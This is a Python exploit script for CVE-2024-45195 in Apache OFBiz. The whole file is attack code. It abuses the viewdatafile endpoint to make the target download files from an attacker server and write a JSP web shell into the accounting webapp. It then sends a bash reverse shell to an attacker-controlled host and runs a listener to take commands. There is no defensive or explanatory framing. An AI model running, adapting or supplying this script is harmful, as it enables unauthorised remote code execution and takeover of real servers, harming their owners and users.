# Apache Ofbiz < 18.12.16

# Regex:
# ^([1-5])\.(\d+)\.(\d+)$|^16\.(\d+)\.(\d+)$|^17\.(\d+)\.(\d+)$|^18\.(0|[1-9]|1[0-2])\.(0|[1-9]|1[0-5])$

# Remote Code Execution 

import requests
import argparse
import socket
import select
import threading
import sys
import urllib3
import subprocess
import urllib.parse
from urllib.parse import urlparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def vulnerable_check(url, vuln_dir, header):  
    try:
        response = requests.post(url+vuln_dir, headers=header, verify=False)
        if response.status_code == 200 and "viewdatafile" in response.text:
            print("[+] Detected Vulnerability : True\n")
        else:
            print("[-] Detected Vulnerability : False")
            sys.exit()       
    except requests.RequestException:
            print("[!] Error Occured in Checking Vulnerable")
            sys.exit()


# Start server listening for reverse shell script
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("Receive Shell Success!!")
        print("\nPut your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()
            
            
parser = argparse.ArgumentParser(usage="""CVE-2024-45195.py -u https://*.*.*.*/ -as http://attacker.server/ -lh 0.tcp.jp.ngrok.io -lp 17306 -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--AttackerServer', '-as', help='Attacker server to get xml,csv file', required=False)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()

url = args.URL.rstrip('/')
attacker_server = args.AttackerServer.rstrip('/')

vuln_dir = "/webtools/control/forgotPassword/viewdatafile" # Endpoint using vulnerable component 

shell_path = "/accounting/index.jsp" # Vulnerable server local path to download web shell

header_request = {'Content-Type': 'application/x-www-form-urlencoded'}

injection_payload = f"DATAFILE_LOCATION={attacker_server}/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp{shell_path}&DATAFILE_IS_URL=true&DEFINITION_LOCATION={attacker_server}/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce"

try:
    vulnerable_check(url, vuln_dir, header_request)
    
    if args.lhost and args.lport and args.fport:    
        
        response = requests.post(url+vuln_dir, headers=header_request, data=injection_payload, verify=False) # Upload web shell
        if response.status_code == 200:
            shell_payload = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"
                
            print("[+] Server Listening start.....")
            listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
            listen_thread.start()
            
            print("[+] Sending reverse shell payload....")
            encoded_payload = urllib.parse.quote(shell_payload)
            res = requests.post(f"{url}{shell_path}?cmd={encoded_payload}", headers=header_request, verify=False) 
            
            listen_thread.join()
        else:
            print("(!) Error occured in reverse shell connection")
    else:
        print("Vulnerability check finish.")

except requests.RequestException:
    print("(!) Error occured in progress of uploading webshell")
    sys.exit()
